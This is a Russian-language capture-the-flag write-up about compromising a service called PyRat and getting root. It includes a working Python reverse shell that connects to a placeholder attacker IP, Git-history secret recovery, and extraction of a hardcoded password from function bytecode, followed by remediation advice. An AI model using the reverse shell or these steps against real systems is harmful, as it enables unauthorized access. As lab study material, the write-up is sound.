## Reverse shell

Чтобы получить полноценный доступ к системе, я запустил на своей машине слушатель и отправил Python-код, который подключает стандартные потоки к сокету:

```python
import socket, os, pty
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("<ВАШ_IP>", 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
pty.spawn("/bin/bash")
```

## Git-история и подсказки

В `/opt/dev/` находился скрытый Git-репозиторий. Я просмотрел историю изменений командой:

```bash
HOME=/tmp git -C /opt/dev log -p
```

Переменная `HOME=/tmp` помогла Git не обращаться к недоступному домашнему каталогу. Флаг `-C` задаёт репозиторий, а `-p` показывает изменения строк кода.

История раскрыла старые версии PyRat: пароль менялся с `testpass` на `abc123`, а в коде появился скрытый endpoint. Это подтвердило, что удалённые из текущей версии секреты всё ещё можно найти в коммитах.

## Интроспекция работающей программы

Файл `/root/pyrat.py` напрямую прочитать не удавалось, но RCE выполнялся в том же процессе, где уже была загружена функция `get_admin`. Поэтому я использовал атрибуты объекта функции:

```python
print(get_admin.__code__.co_consts)
```

В списке констант оказался пароль `abc123`. Это сработало потому, что пароль был захардкожен в исходном коде и попал в байткод функции.

![Git-история и найденные изменения в PyRat](../images/Pasted%20image%2020260328034119.png)

Дальше я отправил сервису последовательность `admin` → `abc123` → `shell`. После добавления моего сокета в список `admins` функция сброса UID больше не переводила процесс в `www-data`, и shell сохранил root-привилегии.

![Подключение к PyRat и проверка административного режима](../images/Pasted%20image%2020260328034358.png)

## Итог

Основная цепочка выглядела так:

1. Сервис на `8000` скрывал Python-интерпретатор за нестандартным текстовым протоколом.
2. RCE позволил получить reverse shell.
3. Git-история раскрыла логику PyRat и старые секреты.
4. `get_admin.__code__.co_consts` позволил извлечь пароль из памяти процесса.
5. После входа в административный режим команда `shell` дала доступ к флагам.

## Что нужно исправить

- Не выполнять пользовательский ввод через `exec()` или `eval()`.
- Не хранить пароли в исходном коде и Git-истории; при утечке истории считать их скомпрометированными.
- Ограничить доступ к `.git` на сервере.
- Разделить сервис и системные привилегии: сетевой демон не должен работать от root.
- Добавить журналирование и контроль подозрительных подключений.

Это была одна из самых интересных комнат: фактически я исследовал не только сам сервер, но и логику RAT, который на нём работал.
